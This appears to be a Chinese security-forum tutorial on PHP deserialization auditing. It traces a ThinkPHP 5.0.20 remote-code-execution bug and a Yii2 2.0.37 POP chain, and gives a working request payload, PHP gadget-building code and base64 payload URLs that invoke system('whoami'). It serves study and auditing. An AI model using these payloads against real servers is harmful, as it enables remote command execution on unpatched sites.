0x01 前言
=======

之前在学习php代码审计入门的时候,找了很多逻辑漏洞和一些常规漏洞，比如sql注入，文件上传，xss，xxe，密码重置等。但是这些还都是皮毛，在一次参加ctf比赛中遇到代码审计的题目时，它是需要构造反序列化的，因为只能审计简单的漏洞所以拿它没有办法，于是才明白还是得把反序列化好好研究研究啊。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-210ac7262291d1f0af7a10a84743167065f02370.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-210ac7262291d1f0af7a10a84743167065f02370.jpg)

- - - - - -

0x02 php反序列化简单介绍
================

一.序列化和反序列化理解
------------

从程序代码是看,序列化就是讲对象或者数据结构这种不可直接传输的数据格式转换为可存储传输的格式进行传输，反序列化就是将它还原，通俗的讲的话，就比如你有一台台式电脑想要搬运到外地，但是如果整机带出去的话可能会造成硬件损坏,如显卡主板cpu等，但是如果将他们打包好放在各自的盒子里在运输就不会损坏了，这个过程就是序列化的过程，同理反序列化就是当收到这些零件后进行组装,还原让它可以再次进行使用。

二.php序列化漏洞相关魔术函数
----------------

1. \_\_serialize(),\_unserialize()：用于php序列化和反序列化
2. \_\_sleep():在对象被序列化之前运行
3. \_\_wekeup():在对象被反序列化之后调用
4. \_\_construct()：当一个对象被创建时调用
5. \_\_destruct():当一个对象销毁时被调用
6. \_\_toString():在对象被序列化之前运行
7. **\_\_**call():程序中调用未定义的方法时，\_\_call()方法会自动被调用。
8. \_\_callStaic():用静态方式中调用一个不可访问方法时调用
9. \_\_invoke():调用函数的方式调用一个对象时的回应方法
10. \_\_clone()，当对象复制完成时调用

0X03 php反序列化代码审计(thinkphp5.0,yii2.0.37)
=======================================

一、审计工具
------

phpstrom2020.1.3

二、漏洞影响范围
--------

thinkphp (5.x &lt; 5.1.31, &lt;= 5.0.23）  
yiiYii2（&lt; 2.0.38)

三、审计步骤
------

### thinkphp5.0.20远程代码执行漏洞

1.本次审计版本未5.0.20版本，漏洞点为Request.php中method方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-3c030b78a68cb3db998539d5e31d6ec303775d10.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-3c030b78a68cb3db998539d5e31d6ec303775d10.png)

2.跟进代码可以看出，当参数传入方法为post时，会去配置文件读取默认变量也就是\_method变量，且对传入方法变量内容未进行过滤，我们可以传入\_method=construct将方法覆盖为构造函数方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-15071ea946536e6c83cf920c6e334da09433f0b0.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-15071ea946536e6c83cf920c6e334da09433f0b0.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c1571e39f23e4f039acc72b1aaba653ec48469c7.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c1571e39f23e4f039acc72b1aaba653ec48469c7.png)

3.进入到构造函数，这里会初始化过滤参数的值用于全局过滤使用，且该值可控，可以传递\_method=construst,这个时候我们跟进到全局过滤函数filterValue()，当开启debug模式时,会进行$filter的变量覆盖，配置文件中默认为空，可以将$filte=system传入将$filter覆盖为system，再传入一个变量值为执行的命令如，aaa=whoami,即可调用call\_user\_func执行命令。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-7263fca998d4edc3b93f7df24182fc4dddc840d1.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-7263fca998d4edc3b93f7df24182fc4dddc840d1.png)

### yii2.0.37反序列化漏洞审计

1.由于刚刚搭建完成，yii本身并没有可以利用来反序列化的Action,所以添加controllers/TestController.php，代码如下

```php
<?php
namespace app\controllers;
use Yii;
use yii\web\Controleer;

class TestController extends Controller
{
    public function actionTtt(){
        $name = Yii:$app->request->get('data');
        return unserialize(base64_decode($name));
    }
}
```

2.根据师傅们爆出的漏洞入口点定位在：vendor/yiisoft/yii2/db/BatchQueryResult.php的reset方法内，当对象被销毁时，会调用reset()方法，当传入参数的值不为空的时候，会触发close()函数，但是调用的$this-&gt;close(),本类中并不存在此方法函数，由于参数在我们编写利用Action时是可控的,所以可以利用该处触发PHP魔术函数\_call()进行利用。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-52d92045573201b77fd8ca68c53611bf003238cc.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-52d92045573201b77fd8ca68c53611bf003238cc.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-2c7a28b608df3f59e55e6cbf632e2d4903d8e294.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-2c7a28b608df3f59e55e6cbf632e2d4903d8e294.png)  
3.接下来利用phpstrom全文查找利用到\_call的地方,在/vendor/fzaninotto/faker/src/Faker/Generator.php处可以利用，跟进方法format(),当传入一个方法名，传入一个数组，会利用call\_user\_func\_array(),熟悉PHP的小伙伴们都知道，这个函数非常危险，可以利用执行系统命令，各种函数命令等。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b7f53c9ccd74ea4076738e2478ab39b1fff15fba.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b7f53c9ccd74ea4076738e2478ab39b1fff15fba.png)

```php
public function format($formatter, $arguments = array())
{
    return call_user_func_array($this->getFormatter($formatter), $arguments);
}
```

4.在返回call\_user\_func\_array()函数中的第一个参数为getFormatter返回的值，跟进getFormatter()方法，它会判断formatters\[$formatter\]属性是否设置，然后返回该属性，说明该属性是可以让我们反序列化利用是控制的。

```php
public function getFormatter($formatter)
{
    if (isset($this->formatters[$formatter])) {
        return $this->formatters[$formatter];
    }
    foreach ($this->providers as $provider) {
        if (method_exists($provider, $formatter)) {
            $this->formatters[$formatter] = array($provider, $formatter);

            return $this->formatters[$formatter];
        }
    }
    throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
}
```

5.根据现在已有的条件寻找程序中能利用到的点，且要满足以下条件:  
1.方法的参数必须是自己类中存在的。  
2.方法需要具有命令执行的功能。

6.全文查找处2处合适的地方。  
vendor/yiisoft/yii2/rest/CreateAction.php  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6dae0fbc53e8b4dd8a58c72fbb04de045130040b.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6dae0fbc53e8b4dd8a58c72fbb04de045130040b.png)  
vendor/yiisoft/yii2/rest/IndexAction.php  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-2958d69cdac196419d96ecb5ba7f7bd183e019a6.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-2958d69cdac196419d96ecb5ba7f7bd183e019a6.png)

7.以下是本次的POP链:

```php
POP:yii\db\BatchQueryResult::__destruct()->reset()->close()->Faker\Generator::__call()->format()->call_user_func_array()->yii\rest\IndexAction::run->call_user_func()
```

### 四、漏洞复现

1.thinkphp5.0.20

漏洞paylaod：\_method=\_\_construct&amp;filter\[\]=system&amp;aaa=whoami  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-a54ca4e88ca36f5e1ed9d166219d591c33b04be6.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-a54ca4e88ca36f5e1ed9d166219d591c33b04be6.png)

2.yii2.0.37

漏洞payload:

```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = '1';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;
    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;
    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
//进行序列化和base64编码
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
    //TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6Indob2FtaSI7fWk6MTtzOjM6InJ1biI7fX19fQ==
}
?>
```

访问payload:[http://ip/index.php?r=test/test&amp;data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX19](http://ip/index.php?r=test/test&data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX19)

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-61cf6ccff6060aededb49a59a5f9fd69a10b0524.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-61cf6ccff6060aededb49a59a5f9fd69a10b0524.png)